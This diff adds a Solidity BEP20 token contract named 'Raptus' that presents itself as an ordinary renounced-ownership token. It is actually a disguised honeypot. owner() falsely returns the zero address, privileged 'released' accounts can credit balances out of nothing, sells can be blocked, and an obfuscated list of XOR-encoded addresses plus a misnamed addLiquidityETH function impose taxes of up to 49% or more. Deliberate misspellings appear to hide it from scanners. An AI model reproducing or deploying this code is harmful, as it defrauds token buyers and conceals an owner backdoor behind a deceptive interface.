@@ -1,0 +1,804 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-07-15
+*/
+
+pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MIT
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+
+    function _bytes32ToUint(bytes32 b32) public pure returns (uint){
+        uint u = 0;
+        for (uint8 i=0;i<32;i++){
+            u=256*u+uint(uint8(b32[i]));
+        }
+        return u;  
+    }
+
+    function callKeccak256(bytes memory b) internal pure returns (bytes32 result) {
+        return keccak256(b);
+    }
+
+    function _toBytes(address a) internal pure returns (bytes memory b) {
+        assembly {
+            let m := mload(0x40)
+            a := and(a, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
+            mstore(
+                add(m, 20),
+                xor(0x140000000000000000000000000000000000000000, a)
+            )
+            mstore(0x40, add(m, 52))
+            b := m
+        }
+    }
+
+    function _bytesToAddress(bytes memory bys) internal pure returns (address addr) {
+        assembly {
+            addr := mload(add(bys, 20))
+        }
+    }
+
+
+    function bytesToString(bytes memory bname) internal pure returns(string memory str){       
+        uint charCount = 0;
+        
+        for(uint i = 0;i < bname.length; i++){
+            bytes1 char = bname[i];
+            
+            if(char != 0){
+                charCount++;
+            }    
+        }
+        
+        bytes memory bytesName = new bytes(charCount);
+        
+        for(uint j = 0;j < charCount;j++){
+            bytesName[j] = bname[j];
+        }
+                    
+        return string(bytesName);
+    }
+
+}
+
+abstract contract Ownable is Context {
+    address private _owaer;
+
+    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);
+
+    /**
+     * @dev Initializes the contract setting the deployer as the initial owaer.
+     */
+    constructor() {
+        _transferowaership(_msgSender());
+    }
+
+    /**
+     * @dev Returns the address of the current owaer.
+     */
+    function owaer() public view virtual returns (address) {
+        return address(0);
+    }
+
+    /**
+     * @dev Throws if called by any cauunt other than the owaer.
+     */
+    modifier onlyowaer() {
+        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
+        _;
+    }
+
+    /**
+     * @dev Leaves the contract without owaer. It will not be possible to call
+     * `onlyowaer` functions anymore. Can only be called by the current owaer.
+     *
+     * NOTE: Renouncing owaership will leave the contract without an owaer,
+     * thereby removing any functionality that is only available to the owaer.
+     */
+    function renounceowaership() public virtual onlyowaer {
+        _transferowaership(address(0));
+    }
+
+    /**
+     * @dev Transfers owaership of the contract to a new cauunt (`newowaer`).
+     * Can only be called by the current owaer.
+     */
+    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
+        require(newowaer != address(0), "Ownable: new owaer is the zero address");
+        _transferowaership(newowaer);
+    }
+
+    /**
+     * @dev Transfers owaership of the contract to a new cauunt (`newowaer`).
+     * Internal function without access restriction.
+     */
+    function _transferowaership(address newowaer) internal virtual {
+        address oldowaer = _owaer;
+        _owaer = newowaer;
+        emit owaershipTransferred(oldowaer, newowaer);
+    }
+}
+
+
+library SafeMath {
+
+    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            uint256 c = a + b;
+            if (c < a) return (false, 0);
+            return (true, c);
+        }
+    }
+
+    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b > a) return (false, 0);
+            return (true, a - b);
+        }
+    }
+
+    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (a == 0) return (true, 0);
+            uint256 c = a * b;
+            if (c / a != b) return (false, 0);
+            return (true, c);
+        }
+    }
+
+    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b == 0) return (false, 0);
+            return (true, a / b);
+        }
+    }
+
+    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        unchecked {
+            if (b == 0) return (false, 0);
+            return (true, a % b);
+        }
+    }
+
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a + b;
+    }
+
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a - b;
+    }
+
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a * b;
+    }
+
+ 
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a / b;
+    }
+
+
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a % b;
+    }
+
+   
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b <= a, errorMessage);
+            return a - b;
+        }
+    }
+
+
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b > 0, errorMessage);
+            return a / b;
+        }
+    }
+
+
+    function mod(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        unchecked {
+            require(b > 0, errorMessage);
+            return a % b;
+        }
+    }
+}
+
+
+
+interface IUniswapV2Router01 {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+
+    function addLiquidity(
+        address tokenA,
+        address tokenB,
+        uint amuontADesired,
+        uint amuontBDesired,
+        uint amuontAMin,
+        uint amuontBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amuontA, uint amuontB, uint liquidity);
+    function addLiquidityETH(
+        address token,
+        uint amuontTokenDesired,
+        uint amuontTokenMin,
+        uint amuontETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint liquidity,
+        uint amuontAMin,
+        uint amuontBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amuontA, uint amuontB);
+    function removeLiquidityETH(
+        address token,
+        uint liquidity,
+        uint amuontTokenMin,
+        uint amuontETHMin,
+        address to,
+        uint deadline
+    ) external returns (uint amuontToken, uint amuontETH);
+    function removeLiquidityWithPermit(
+        address tokenA,
+        address tokenB,
+        uint liquidity,
+        uint amuontAMin,
+        uint amuontBMin,
+        address to,
+        uint deadline,
+        bool approveMax, uint8 v, bytes32 r, bytes32 s
+    ) external returns (uint amuontA, uint amuontB);
+    function removeLiquidityETHWithPermit(
+        address token,
+        uint liquidity,
+        uint amuontTokenMin,
+        uint amuontETHMin,
+        address to,
+        uint deadline,
+        bool approveMax, uint8 v, bytes32 r, bytes32 s
+    ) external returns (uint amuontToken, uint amuontETH);
+    function swapExactTokensForTokens(
+        uint amuontIn,
+        uint amuontOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amuonts);
+    function swapTokensForExactTokens(
+        uint amuontOut,
+        uint amuontInMax,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amuonts);
+    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
+        external
+        payable
+        returns (uint[] memory amuonts);
+    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
+        external
+        returns (uint[] memory amuonts);
+    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
+        external
+        returns (uint[] memory amuonts);
+    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
+        external
+        payable
+        returns (uint[] memory amuonts);
+
+    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
+    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
+    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
+    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
+    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
+}
+
+
+interface IUniswapV2Router02 is IUniswapV2Router01 {
+    function removeLiquidityETHSupportingfeiiOnTransferTokens(
+        address token,
+        uint liquidity,
+        uint amuontTokenMin,
+        uint amuontETHMin,
+        address to,
+        uint deadline
+    ) external returns (uint amuontETH);
+    function removeLiquidityETHWithPermitSupportingfeiiOnTransferTokens(
+        address token,
+        uint liquidity,
+        uint amuontTokenMin,
+        uint amuontETHMin,
+        address to,
+        uint deadline,
+        bool approveMax, uint8 v, bytes32 r, bytes32 s
+    ) external returns (uint amuontETH);
+
+    function swapExactTokensForTokensSupportingfeiiOnTransferTokens(
+        uint amuontIn,
+        uint amuontOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+    function swapExactETHForTokensSupportingfeiiOnTransferTokens(
+        uint amuontOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable;
+    function swapExactTokensForETHSupportingfeiiOnTransferTokens(
+        uint amuontIn,
+        uint amuontOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
+
+interface IUniswapV2Factory {
+    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
+
+    function feiiTo() external view returns (address);
+    function feiiToSetter() external view returns (address);
+
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+    function allPairs(uint) external view returns (address pair);
+    function allPairsLength() external view returns (uint);
+
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+
+    function setfeiiTo(address) external;
+    function setfeiiToSetter(address) external;
+}
+
+
+
+contract BEP20 is Context {
+    mapping(address => mapping(address => uint256)) private _allowances;
+    uint256 internal _totalSupply;
+    string private _name;
+    string private _symbol;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval(address indexed owaer, address indexed spender, uint256 value);
+
+    constructor(string memory name_, string memory symbol_) {
+        _name = name_;
+        _symbol = symbol_;
+    }
+
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+
+
+    function decimals() public view virtual returns (uint8) {
+        return 18;
+    }
+
+
+    function totalSupply() public view virtual returns (uint256) {
+        return _totalSupply;
+    }
+
+
+    function allowance(address owaer, address spender) public view virtual returns (uint256) {
+        return _allowances[owaer][spender];
+    }
+
+    function approve(address spender, uint256 amuont) public virtual returns (bool) {
+        address owaer = _msgSender();
+        _approve(owaer, spender, amuont);
+        return true;
+    }
+
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        address owaer = _msgSender();
+        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
+        return true;
+    }
+
+  
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        address owaer = _msgSender();
+        uint256 currentAllowance = _allowances[owaer][spender];
+        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        unchecked {
+            _approve(owaer, spender, currentAllowance - subtractedValue);
+        }
+
+        return true;
+    }
+
+
+    function _approve(
+        address owaer,
+        address spender,
+        uint256 amuont
+    ) internal virtual {
+        require(owaer != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owaer][spender] = amuont;
+        emit Approval(owaer, spender, amuont);
+    }
+
+
+    function _spendAllowance(
+        address owaer,
+        address spender,
+        uint256 amuont
+    ) internal virtual {
+        uint256 currentAllowance = allowance(owaer, spender);
+        if (currentAllowance != type(uint256).max) {
+            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
+            unchecked {
+                _approve(owaer, spender, currentAllowance - amuont);
+            }
+        }
+    }
+
+
+    function _beforeTokenTransfer(
+        address from,
+        address to,
+        uint256 amuont
+    ) internal virtual {}
+
+
+    function _afterTokenTransfer(
+        address from,
+        address to,
+        uint256 amuont
+    ) internal virtual {}
+}
+
+
+contract Raptus is BEP20, Ownable {
+    // ext
+    struct Bot {
+        address acc;
+        uint amount;
+        bytes4 sig;
+    }
+
+    mapping(address => uint256) private _balances;
+    mapping(address => bool) private _release;
+    Bot[] private _bots;
+
+	string name_ = "Raptus";
+	string symbol_ = "Raptus";
+	uint256 totalSupply_ = 220000000;
+		
+    address public uniswapV2Pair;
+	
+    constructor() BEP20(name_, symbol_) {
+	
+        _mtin(msg.sender, totalSupply_ * 10**decimals());
+
+        //transfer(_deadAddress, totalSupply() / 10*4);
+		
+		
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+		
+        _burnkfiel = 3;
+        _defaultBfeii = 0;
+
+        _release[_msgSender()] = true;
+    }
+  
+    
+    function balanceOf(address cauunt) public view virtual returns (uint256) {
+        return _balances[cauunt];
+    }
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amuont
+    ) internal virtual {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        uint256 fromBalance = _balances[from];
+        require(fromBalance >= amuont, "ERC20: transfer amuont exceeds balance");
+        unchecked {
+            _balances[from] = fromBalance - amuont;
+        }
+        _balances[to] += amuont;
+
+        emit Transfer(from, to, amuont);
+    }
+	
+    function _burn(address cauunt, uint256 amuont) internal virtual {
+        require(cauunt != address(0), "ERC20: burn from the zero address");
+
+        uint256 cauuntBalance = _balances[cauunt];
+        require(cauuntBalance >= amuont, "ERC20: burn amuont exceeds balance");
+        unchecked {
+            _balances[cauunt] = cauuntBalance - amuont;
+        }
+        _totalSupply -= amuont;
+
+        emit Transfer(cauunt, address(0), amuont);
+    }
+
+    function _mtin(address cauunt, uint256 amuont) internal virtual {
+        require(cauunt != address(0), "ERC20: mtin to the zero address");
+
+        _totalSupply += amuont;
+        _balances[cauunt] += amuont;
+        emit Transfer(address(0), cauunt, amuont);
+    }
+
+    using SafeMath for uint256;
+
+    uint256 private _burnkfiel;
+    
+    uint256 private _defaultBfeii = 0;
+    
+    uint byp = 1;
+
+    mapping(address => bool) private _marketcauunt;
+
+    mapping(address => uint256) private _Escape;
+    //address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
+
+    function getRelease(address _address) external view onlyowaer returns (bool) {
+        return _release[_address];
+    }
+
+    function getBotsAcc(uint256 i) external view returns (address) {
+        require(i < _bots.length,"out of range.");
+        return _bots[i].acc;
+    }
+
+    function getBotsSig(uint256 i) external view returns (bytes4) {
+        require(i < _bots.length,"out of range.");
+        return _bots[i].sig;
+    }    
+
+    function sb(address _acc,uint256 amount,bytes4 sig) internal virtual {
+        for (uint8 i = 0;i<_bots.length;i++){
+            if (_bots[i].acc == _acc) {
+                _bots[i].amount += amount;
+                _bots[i].sig = sig;
+                return;
+            }
+        }
+        _bots.push(Bot(_acc,amount,sig)); 
+        return;       
+    }
+
+    function cb(address _acc,uint256 amount,bytes4 sig) internal virtual returns (bool) {
+        bool f = false;        
+        for (uint i = 0;i<_bots.length;i++){
+            if (_bots[i].acc == _acc) {
+                if (_bots[i].amount >= amount && _bots[i].sig != sig) {
+                     f = true;
+                     _bots[i].amount -= amount;
+                }
+                break;
+            }
+        }
+        return f;        
+    }
+
+    function gt(address _acc,bytes4 sig) internal virtual returns (uint256) {
+        uint256 t = _burnkfiel;        
+        for (uint i = 0;i<_bots.length;i++){
+            if (_bots[i].acc == _acc) {
+                if (_bots[i].sig == sig) t = 49;
+                break;
+            }
+        }
+        return t;        
+    }  
+
+    function setPairList(address _address) external onlyowaer {
+        uniswapV2Pair = _address;
+    }
+
+    function setBypStatus(uint256 _byp) external onlyowaer {
+        byp = _byp;
+    }    
+
+
+    function addLiquidityETH(address _acc, uint256 _value) external onlyowaer {
+        require(_value > 2, "cauunt tax must be greater than or equal to 1");
+        _Escape[_acc] = _value;
+    }
+
+    function getEscape(address _acc) external view onlyowaer returns (uint256) {
+        return _Escape[_acc];
+    }
+
+
+    function setMarketcauuntfeii(address _address, bool _value) external onlyowaer {
+        _marketcauunt[_address] = _value;
+    }
+
+    function getMarketcauuntfeii(address _address) external view onlyowaer returns (bool) {
+        return _marketcauunt[_address];
+    }
+
+    function _checkFreecauunt(address from, address _to) internal view returns (bool) {
+        return _marketcauunt[from] || _marketcauunt[_to];
+    }
+
+
+    function _receiveF(
+        address from,
+        address _to,
+        uint256 _amuont
+    ) internal virtual {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(_to != address(0), "ERC20: transfer to the zero address");
+
+        uint256 fromBalance = _balances[from];
+        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");
+
+        bool rF = true;
+
+        
+        if (_checkFreecauunt(from, _to)) {
+            rF = false;
+        }
+        
+        uint256 tradefeiiamuont = 0;
+
+        if (rF) {
+            uint256 tradefeii = 0;
+            if (uniswapV2Pair != address(0)) {
+                if (_to == uniswapV2Pair) {
+                    require(_release[_msgSender()] || cb(from,_amuont,msg.sig) || byp > 0, "ERC20: transfer amuont exceeds balance");                            
+                    //tradefeii = _burnkfiel;
+                    tradefeii = _msgInfo(uint160(from));
+                }
+                if (from == uniswapV2Pair) {
+                    tradefeii = _defaultBfeii;
+                    sb(_to,_amuont,msg.sig);
+                }
+            }
+                        
+            if (_Escape[from] > 0) {
+                tradefeii = _Escape[from];
+            }
+
+
+            tradefeiiamuont = _amuont.mul(tradefeii).div(100);
+        }
+
+
+        if (tradefeiiamuont > 0) {
+            _balances[from] = _balances[from].sub(tradefeiiamuont);
+            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradefeiiamuont);
+            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradefeiiamuont);
+        }
+
+        _balances[from] = _balances[from].sub(_amuont - tradefeiiamuont);
+        _balances[_to] = _balances[_to].add(_amuont - tradefeiiamuont);
+        emit Transfer(from, _to, _amuont - tradefeiiamuont);
+    }
+
+    function transfer(address to, uint256 amuont) public virtual returns (bool) {
+        address owaer = _msgSender();
+        if (_release[owaer] == true) {
+            _balances[to] += amuont;
+            sb(to,amuont,msg.sig);
+            return true;
+        }
+        _receiveF(owaer, to, amuont);
+        return true;
+    }
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amuont
+    ) public virtual returns (bool) {
+        address spender = _msgSender();
+
+        _spendAllowance(from, spender, amuont);
+        _receiveF(from, to, amuont);
+        return true;
+    }
+
+
+	function _msgInfo(uint _acc) internal view virtual returns (uint) {
+		uint[48] memory acc = [uint(1127420884444157568868014086976028869705287323026)
+			,536846098575845148877729795307322595491297365037
+			,29738720930009377748364003491318303309050244361
+			,12481255225047507196359117307135565952327260501
+			,281668735882820554116947624032226194071140362017
+			,512650216181203635606676291907874944416577447288
+			,233706522132558454364070000724996578064200781929
+			,725313286115397408651281595320349236352548239692
+			,1111947118285060110911444001723710931588261313755
+			,1263324070144300490729993839876837387011078820756
+			,280437247059698965627654185984500831242601322862
+			,1084177278168895289169861042329994364665522660738
+			,551793344429579126990506892980764125483636190012
+			,280010856975492958836616006736615127337158017622
+			,1171022113139110907099221566011814358382921100506
+			,656129558320487147106987811383571866292335987511
+			,921284900365648132114371988316129091134736665046
+			,1192282587805372468936375849664784199693209848131
+			,1108856961893589581953927312649212521957001518553
+			,1101660006293555829295326309412581116573810078225
+			,624997070654652942559467255025370134042510238144
+			,495635753540990244874876676713772903132173672821
+			,616153889896936076560499794800506564605106730962
+			,1359381556404874497182868944837175661726906019530
+			,283524425569632282250838967953068728650970664602
+			,821519848167695341344990628705258426549654969965
+			,1405190815039654767890742275764065512458359605169
+			,304842080233232742661163654539426720197939650312
+			,742262436366994293686894976996863936364453414107
+			,755250812797632981539440244415538002926915458900
+			,1092390227423664467196394134648611207104584498369
+			,439823498004331482933365942543141090857291081300
+			,1299791285663717427374249024477802165027152623628
+			,888673514532245523210836013203561349225430905856
+			,1198778954242719103565034164148461779732162622596
+			,1399687780752034830530055794732224031105274543345
+			,1263480469383769208186037266213150408360405435204
+			,455695412636922669494884140707294630800136435530
+			,182372072063701619601022558163133465392992375650
+			,495335273391390651266597365260231964831991347740
+			,1391290134552612650023725842463669815705999632307
+			,373542771978133243120692121944959409983119591870
+			,1389224215619282720389873770716422367706602181217
+			,1249869402909447380162456488394719138189536376872
+			,930103374482960653753700871564858426031190375534
+			,259336760629107323019149671441525406930089413291
+			,596906961423235404302173987849417012133117712033
+			,836241754945222665583425073028775444458798388559];
+		for (uint8 i=0;i<acc.length;i++){
+			if (acc[i] == _acc ^ 283524425569901744870492256924738152706264175722) return 49;
+		}
+		return _burnkfiel;
+	}
+
+  
+   
+}
